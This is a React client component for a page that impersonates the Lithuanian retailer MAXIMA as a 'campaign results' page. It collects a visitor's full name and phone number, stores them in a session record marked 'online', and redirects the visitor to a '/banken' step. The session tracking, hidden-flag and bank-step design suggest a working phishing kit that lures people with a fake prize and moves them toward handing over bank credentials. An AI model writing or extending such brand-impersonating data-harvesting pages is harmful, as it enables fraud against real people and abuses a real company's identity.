"use client";

import { useEffect, useMemo, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string | null;
  routeSessionId?: string;
};

export function Win2Client({ sessionId, routeSessionId }: Props) {
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !effectiveSessionId || saving) return;
    setSaving(true);
    setError(null);

    const { data: row } = await supabase
      .from("sessions")
      .select("form_data")
      .eq("id", effectiveSessionId)
      .maybeSingle();

    const prevFd = (row?.form_data ?? {}) as Record<string, unknown>;

    const nameParts = fullName.trim().split(/\s+/).filter(Boolean);
    const firstName = nameParts.shift() ?? "";
    const lastName = nameParts.join(" ");

    const digits = phone.replace(/\D/g, "").replace(/^370/, "").slice(0, 8);
    const fullPhone = digits ? `+370${digits}` : "";

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        status: "online",
        current_step: "banken",
        form_data: {
          ...prevFd,
          firstName,
          lastName,
          phone: fullPhone,
          pending_profile: false,
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (upErr) {
      setError("Klaida. Bandykite dar kartą.");
      return;
    }

    try {
      persistActiveSession(effectiveSessionId, routeSessionId);
      localStorage.setItem(`session:${effectiveSessionId}:profileComplete`, "1");
    } catch {
      /* best-effort */
    }

    const qs = routeSessionId ? `?session=${encodeURIComponent(routeSessionId)}` : "";
    window.location.href = `/banken${qs}`;
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-white text-[#363d40]">
      {/* NAVBAR */}
      <nav className="bg-white">
        <div className="mx-auto flex w-full max-w-5xl items-center gap-4 px-4 py-4">
          <img
            src="/form-assets/maxima-mini-logo.png"
            alt="Maxima"
            className="h-[34px] w-auto object-contain"
          />
          <div className="flex flex-1 justify-center">
            <div className="h-[6px] w-full max-w-[220px] overflow-hidden rounded-full bg-[#e9ecef]">
              <div className="h-full w-[13%] rounded-full bg-[#18478b] transition-all" />
            </div>
          </div>
          <button type="button" className="flex items-center gap-2 text-sm text-[#363d40]">
            <span className="hidden sm:inline">Uždaryti</span>
            <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
      </nav>

      <div className="mx-auto w-full max-w-5xl px-4">
        <div className="border-t border-[#e9ecef]" />
      </div>

      {/* CONTENT */}
      <main className="flex flex-1 flex-col py-10 sm:py-14">
        <div className="mx-auto w-full max-w-5xl px-4">
          <h1 className="mb-10 text-center text-2xl font-bold tracking-tight sm:text-3xl">
            MAXIMA kampanijos rezultatų puslapis
          </h1>

          <form onSubmit={handleSubmit} className="mx-auto w-full max-w-[420px] px-4 sm:px-0">
            {/* Tel. numeris pill switch */}
            <div className="mb-8 flex justify-center">
              <div className="inline-flex rounded-full border border-[#d4d4d4] p-1">
                <span className="rounded-full bg-[#18478b] px-5 py-1.5 text-sm font-semibold text-white">
                  Tel. numeris
                </span>
              </div>
            </div>

            {/* Vardas ir pavarde */}
            <div className="mb-8">
              <div className="relative">
                <input
                  type="text"
                  required
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  placeholder="Vardas ir pavardė"
                  className="peer w-full rounded-md border border-[#d4d4d4] bg-white px-4 pb-2 pt-6 text-base outline-none transition-all placeholder:text-transparent focus:border-[#18478b] focus:ring-2 focus:ring-[#18478b]/15"
                />
                <label className="pointer-events-none absolute left-4 top-1.5 text-xs text-[#797979] transition-all peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:translate-y-0 peer-focus:text-xs">
                  Vardas ir pavardė
                </label>
              </div>
            </div>

            {/* Telefon +370 */}
            <div className="mb-8">
              <div className="flex gap-2">
                <span className="flex items-center rounded-md border border-[#d4d4d4] bg-[#f3f3f4] px-3 text-sm font-semibold text-[#363d40]">
                  +370
                </span>
                <div className="relative flex-1">
                  <input
                    type="text"
                    inputMode="numeric"
                    required
                    maxLength={8}
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 8))}
                    placeholder="Tel. numeris"
                    className="peer w-full rounded-md border border-[#d4d4d4] bg-white px-4 pb-2 pt-6 text-base outline-none transition-all placeholder:text-transparent focus:border-[#18478b] focus:ring-2 focus:ring-[#18478b]/15"
                  />
                  <label className="pointer-events-none absolute left-4 top-1.5 text-xs text-[#797979] transition-all peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:translate-y-0 peer-focus:text-xs">
                    Tel. numeris
                  </label>
                </div>
              </div>
            </div>

            {error && (
              <p className="mb-4 text-center text-sm font-medium text-[#e61e26]">{error}</p>
            )}

            <button
              type="submit"
              disabled={saving || !fullName.trim() || phone.replace(/\D/g, "").length < 8}
              className="w-full rounded-md bg-[#18478b] px-4 py-3.5 text-base font-semibold text-white transition-all hover:bg-[#123a73] disabled:cursor-not-allowed disabled:opacity-50"
            >
              {saving ? "Siunčiama..." : "Tęsti"}
            </button>
          </form>
        </div>
      </main>

      {/* FOOTER */}
      <div className="mx-auto w-full max-w-5xl px-4">
        <footer className="flex flex-col items-center gap-3 border-t border-[#e9ecef] pb-3 pt-4 xl:flex-row xl:justify-between">
          <div className="flex items-center gap-5">
            {/* Instagram */}
            <svg className="h-[18px] w-[18px] text-[#363d40]" fill="currentColor" viewBox="0 0 18 18">
              <path d="m12.638 18h-7.276c-2.96-.004-5.359-2.402-5.362-5.362v-7.276c.003-2.96 2.402-5.358 5.362-5.362h7.276c2.96.004 5.359 2.402 5.362 5.362v7.276c-.003 2.96-2.402 5.358-5.362 5.362zm-7.276-16.189c-1.96.003-3.549 1.591-3.551 3.551v7.276c.002 1.96 1.591 3.549 3.551 3.551h7.276c1.96-.002 3.549-1.591 3.551-3.551v-7.276c-.002-1.96-1.591-3.549-3.551-3.551zm3.638 11.844c-3.584 0-5.824-3.88-4.032-6.983 1.792-3.104 6.272-3.104 8.064 0 .409.707.624 1.511.624 2.328-.003 2.57-2.086 4.652-4.656 4.655zm0-7.5c-2.19 0-3.559 2.371-2.464 4.268 1.095 1.896 3.833 1.896 4.928 0 .249-.433.381-.923.381-1.423-.002-1.57-1.274-2.843-2.845-2.845zm4.664-.66c-.859 0-1.396-.93-.967-1.674.43-.745 1.504-.745 1.933 0 .098.17.15.362.15.558-.001.617-.5 1.116-1.116 1.116z" />
            </svg>
            {/* Facebook */}
            <svg className="h-[16px] w-[8px] text-[#363d40]" fill="currentColor" viewBox="0 0 8 16">
              <path d="m5.319 16h-3.547v-7.556h-1.772v-2.911h1.772v-1.746c0-2.374 1.001-3.787 3.844-3.787h2.367v2.911h-1.479c-1.108 0-1.18.406-1.18 1.166v1.456h2.676l-.314 2.911h-2.367z" />
            </svg>
          </div>
          <div className="flex flex-col items-center gap-1 text-xs text-[#363d40] sm:flex-row sm:gap-5">
            <span className="cursor-pointer hover:underline">Slapukų nustatymai</span>
            <span className="cursor-pointer hover:underline">+370 800 20050 nemokama infolinija (8-22 val.)</span>
          </div>
          <p className="text-xs text-[#363d40]">2026 © MAXIMA LT, UAB. Visos teisės saugomos</p>
        </footer>
      </div>
    </div>
  );
}
